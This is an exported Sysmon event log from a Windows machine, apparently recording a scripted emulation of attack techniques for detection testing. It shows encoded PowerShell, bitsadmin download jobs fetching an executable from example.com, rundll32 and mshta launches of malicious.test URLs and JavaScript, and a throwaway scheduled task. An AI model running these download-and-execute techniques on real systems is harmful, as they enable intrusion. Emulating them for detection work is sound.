"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.934
ProcessGuid: {3a35410f-9288-6928-4011-000000000b00}
ProcessId: 6060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwA3ACcA 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.868
ProcessGuid: {3a35410f-9288-6928-3e11-000000000b00}
ProcessId: 15284
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:22.548
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 54134
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.8.8
DestinationHostname: dns.google
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:52 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:03:52.777
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask7
CreationUtcTime: 2025-11-27 18:03:52.776
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.740
ProcessGuid: {3a35410f-9288-6928-3c11-000000000b00}
ProcessId: 1076
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job7 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.692
ProcessGuid: {3a35410f-9288-6928-3911-000000000b00}
ProcessId: 7844
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job7 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.653
ProcessGuid: {3a35410f-9288-6928-3811-000000000b00}
ProcessId: 11116
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job7 http://example.com/file.exe C:\Temp\file7.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.543
ProcessGuid: {3a35410f-9288-6928-3611-000000000b00}
ProcessId: 6328
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job7 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.488
ProcessGuid: {3a35410f-9288-6928-3411-000000000b00}
ProcessId: 2352
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask7 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.424
ProcessGuid: {3a35410f-9288-6928-3211-000000000b00}
ProcessId: 8288
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask7 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:52 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:52.366
ProcessGuid: {3a35410f-9288-6928-3111-000000000b00}
ProcessId: 5184
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/7 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:51 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:51.508
ProcessGuid: {3a35410f-9286-6928-2a11-000000000b00}
ProcessId: 12188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_4cnurknc.ygn.ps1
CreationUtcTime: 2025-11-27 18:03:51.508
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:51 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:03:51.462
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-9287-6928-3011-000000000b00}
TargetProcessId: 2372
TargetImage: <unknown process>
NewThreadId: 4908
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:51 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:51.326
ProcessGuid: {3a35410f-9287-6928-2f11-000000000b00}
ProcessId: 12416
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test7') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:21.510
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49922
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:50 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:21.509
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 60901
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:50 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:21.509
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 62918
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:50 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:21.493
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 58320
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 162.159.61.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:50 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:21.101
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57074
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.4.4
DestinationHostname: dns.google
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:50 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:20.748
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 63695
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.8.8
DestinationHostname: dns.google
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.937
ProcessGuid: {3a35410f-9286-6928-2e11-000000000b00}
ProcessId: 14544
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=14 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11535290336 --metrics-shmem-handle=6160,i,5282796955723650646,10579105637814717329,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708999430457380 --mojo-platform-channel-handle=6200 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.724
ProcessGuid: {3a35410f-9286-6928-2d11-000000000b00}
ProcessId: 1848
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-9286-6928-2c11-000000000b00}
ParentProcessId: 11428
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/6
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.638
ProcessGuid: {3a35410f-9286-6928-2c11-000000000b00}
ProcessId: 11428
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/6
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-9285-6928-1911-000000000b00}
ParentProcessId: 6688
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/6 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.454
ProcessGuid: {3a35410f-9286-6928-2a11-000000000b00}
ProcessId: 12188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwA2ACcA 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.356
ProcessGuid: {3a35410f-9286-6928-2811-000000000b00}
ProcessId: 9568
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.301
ProcessGuid: {3a35410f-9286-6928-2611-000000000b00}
ProcessId: 12788
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job6 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.170
ProcessGuid: {3a35410f-9286-6928-2411-000000000b00}
ProcessId: 7180
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job6 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:50.103
ProcessGuid: {3a35410f-9286-6928-2211-000000000b00}
ProcessId: 8256
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
